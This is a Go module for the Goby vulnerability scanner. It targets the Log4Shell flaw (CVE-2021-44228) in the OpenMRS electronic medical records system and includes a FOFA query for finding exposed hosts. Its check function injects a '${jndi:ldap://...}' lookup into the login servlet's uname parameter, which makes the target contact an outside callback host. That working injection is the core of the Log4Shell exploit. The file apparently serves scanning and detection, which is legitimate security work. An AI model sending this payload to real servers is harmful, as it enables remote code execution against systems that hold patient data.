package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "OpenMRS log4j2 Remote command execution vulnerability (CVE-2021-44228)",
    "Description": "<p>OpenMRS is an open source electronic medical record system of OpenMRS in the United States.</p><p>OpenMRS has a log4j2 remote command execution vulnerability. Attackers can use this vulnerability to execute commands arbitrarily on the server side, write to the backdoor, obtain server permissions, and then control the entire web server.</p>",
    "Impact": "OpenMRS log4j2 Remote command execution vulnerability (CVE-2021-44228)",
    "Recommendation": "<p>The supplier has released a solution, please upgrade to the new version:<a href=\"https://github.com/apache/logging-log4j2/tags/\">https://github.com/apache/logging-log4j2/tags/</a></p><p>1. Deploy a web application firewall to monitor database operations.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "OpenMRS",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "OpenMRS log4j2 命令执行漏洞（CVE-2021-44228）",
            "Description": "<p>OpenMRS是美国OpenMRS公司的一套开源的电子病历系统。<br></p><p>OpenMRS&nbsp;存在 log4j2 命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Impact": "<p>OpenMRS 存在 log4j2 命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行命令，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>⼚商已发布了漏洞方案，请及时关注： <a href=\"https://github.com/apache/logging-log4j2/tags\">https://github.com/apache/logging-log4j2/tags</a></p><p></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "OpenMRS",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "OpenMRS log4j2 Remote command execution vulnerability (CVE-2021-44228)",
            "Description": "<p>OpenMRS is an open source electronic medical record system of OpenMRS in the United States.</p><p>OpenMRS has a log4j2 remote command execution vulnerability. Attackers can use this vulnerability to execute commands arbitrarily on the server side, write to the backdoor, obtain server permissions, and then control the entire web server.</p>",
            "Impact": "OpenMRS log4j2 Remote command execution vulnerability (CVE-2021-44228)",
            "Recommendation": "<p>The supplier has released a solution, please upgrade to the new version:<a href=\"https://github.com/apache/logging-log4j2/tags/\" target=\"_blank\">https://github.com/apache/logging-log4j2/tags/</a></p><p>1. Deploy a web application firewall to monitor database operations.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "OpenMRS",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "title=\"OpenMRS\"",
    "GobyQuery": "title=\"OpenMRS\"",
    "Author": "fmbd",
    "Homepage": "https://openmrs.org/",
    "DisclosureDate": "2021-12-29",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228",
        "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
    ],
    "HasExp": false,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10.0",
    "CVEIDs": [
        "CVE-2021-44228"
    ],
    "CNVD": [
        "CNVD-2021-95914"
    ],
    "CNNVD": [
        "CNNVD-202112-799"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10247"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			cmd := fmt.Sprintf("${jndi:ldap://%s}", checkUrl)
			uri := "/openmrs/ms/legacyui/loginServlet"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "uname=2" + cmd + "&pw=1&redirect=%2Fopenmrs%2F&refererURL="
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			httpclient.DoHttpRequest(u, cfg)
			return godclient.PullExists(checkStr, time.Second*10)
		},
		nil,
	))
}
